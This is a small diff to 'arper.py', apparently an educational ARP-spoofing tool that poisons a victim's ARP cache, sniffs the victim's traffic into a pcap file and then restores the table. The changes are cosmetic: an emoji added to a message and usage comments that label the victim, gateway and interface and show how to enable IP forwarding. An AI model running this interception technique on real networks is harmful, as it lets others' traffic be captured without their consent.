@@ -93,7 +93,7 @@ class Arper:
         bpf_filter = "ip host %s" % victim
         packets = sniff(count=count, filter=bpf_filter, iface=self.interface) # Sniff n packets (100 by default)
         wrpcap('arper.pcap', packets) # write off packets to arper.pcap
-        print("Got em' packets")
+        print("Got em' packets! Ɛ( · — ·)3")
         self.restore() # Restore ARP table
         self.poison_thread.terminate() # Stop poisoning
         print('Finished')
@@ -121,7 +121,9 @@ if __name__ == '__main__':
     arpoon.run()
     
 # 𝗧𝗲𝘀𝘁:
+#                      victim    gateway  interface
+# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
 
+# --------------------------- Optional if coms not happening -----------------------------
 # 𝘦𝘤𝘩𝘰 1 > /𝘱𝘳𝘰𝘤/𝘴𝘺𝘴/𝘯𝘦𝘵/𝘪𝘱𝘷4/𝘪𝘱_𝘧𝘰𝘳𝘸𝘢𝘳𝘥 <letting the host know that we can forward packages>
 # 𝘴𝘶𝘥𝘰 𝘴𝘺𝘴 -𝘸 𝘯𝘦𝘵.𝘪𝘯𝘦𝘵.𝘪𝘱.𝘧𝘰𝘳𝘸𝘢𝘳𝘥𝘪𝘯𝘨=1
-# sudo python arper.py 10.0.2.15 10.0.2.1 eth0
